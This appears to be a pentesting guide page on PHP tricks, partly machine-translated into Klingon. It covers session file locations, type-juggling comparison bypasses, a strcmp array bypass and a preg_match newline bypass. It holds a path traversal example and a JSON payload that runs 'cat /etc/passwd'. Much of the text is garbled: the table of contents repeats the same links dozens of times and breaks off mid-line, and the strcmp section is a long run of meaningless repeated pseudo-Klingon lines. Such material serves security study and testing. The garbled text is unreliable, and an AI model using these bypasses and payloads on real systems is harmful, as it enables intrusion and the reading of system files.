# PHP jatlh

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Cookies common location:

This is also valid for phpMyAdmin cookies.

Cookies:
```
PHPSESSID
phpMyAdmin
```
QaStaHvIS:

## Introduction

QaStaHvIS jImej:

This repository contains a collection of PHP tricks and techniques that can be useful during web application penetration testing. These tricks are aimed at helping you identify vulnerabilities and exploit them in PHP-based web applications.

## Table of Contents

DaH jImej:

- [Command Injection](command-injection.md)
- [File Inclusion](file-inclusion.md)
- [File Upload](file-upload.md)
- [Local File Inclusion](local-file-inclusion.md)
- [Remote File Inclusion](remote-file-inclusion.md)
- [SQL Injection](sql-injection.md)
- [Cross-Site Scripting (XSS)](xss.md)
- [Cross-Site Request Forgery (CSRF)](csrf.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [XML External Entity (XXE) Injection](xxe-injection.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Code Injection](code-injection.md)
- [Deserialization Vulnerabilities](deserialization-vulnerabilities.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [Server-Side Request Forgery (SSRF)](ssrf.md)
- [Remote Code Execution (RCE)](rce.md)
- [Server-Side Template Injection (SSTI)](ssti.md)
- [LDAP Injection](ldap-injection.md)
- [Path Traversal](path-traversal.md)
- [Server-Side Template Injection
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Bypassing PHP comparisons

### Loose comparisons/Type Juggling ( == )

If `==` is used in PHP, then there are unexpected cases where the comparison doesn't behave as expected. This is because "==" only compare values transformed to the same type, if you also want to compare that the type of the compared data is the same you need to use `===`.

PHP comparison tables: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` A string which doesn't start with a number is equals to a number
* `"0xAAAA" == "43690" -> True` Strings composed by numbers in dec or hex format can be compare to other numbers/strings with True as result if the numbers were the same (numbers in a string are interpreted as numbers)
* `"0e3264578" == 0 --> True` A string starting with "0e" and followed by anything will be equals to 0
* `"0X3264578" == 0X --> True` A string starting with "0" and followed by any letter (X can be any letter) and followed by anything will be equals to 0
* `"0e12334" == "0" --> True` This is very interesting because in some cases you can control the string input of "0" and some content that is being hashed and compared to it. Therefore, if you can provide a value that will create a hash starting with "0e" and without any letter, you could bypass the comparison. You can find **already hashed strings** with this format here: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Any letter in a string is equals to int 0

More info in [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Type Juggling** also affects to the `in_array()` function by default (you need to set to true the third argument to make an strict comparison):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

**tlhIngan Hol translation:**

ghItlhvam: **ghItlhvam** `strcmp()`/`strcasecmp()`

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`strcasecmp()` **vItlhutlh**

ghItlhvam vItlhutlh: **ghItlhvam** `strcmp()`/`
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
`strcasecmp()` jIboghDI' 'ej 'oH **vaj** **comparison vulnerable** **type juggling** **ghaH**. 'ej, 'ej **comparison** **converting the data to a different type of object before comparing** **example** **vaj**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** **ghItlh** **user input** **validate** **'ej** (ghaH **'ej** **word/regex** **blacklist** **present** **user input** **'ej** **'ach**, **code** **execution** **continue** **jImej**).

#### New line bypass

However, **regexp** **start** **delimiting** `preg_match()` **only checks** **first line** **user input**, **'ach** **somehow** **input** **send** **several lines**, **bypass** **check** **able**. **Example**:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
**bIqaw'be'chugh** **urlencoded** (`%0A`) **value** **bIqaw'be'chugh** **send** **ghItlh** **'ej** **JSON data** **bIqaw'be'chugh** **send** **'ej** **'ej** **lines** **chay'**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Find an example here: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Length error bypass**

(This bypass was tried apparently on PHP 5.2.5 and I couldn't make it work on PHP 7.3.15)\
If you can send to `preg_match()` a valid very **large input**, it **won't be able to process it** and you will be able to **bypass** the check. For example, if it is blacklisting a JSON you could send:

#### **QaD error bypass**

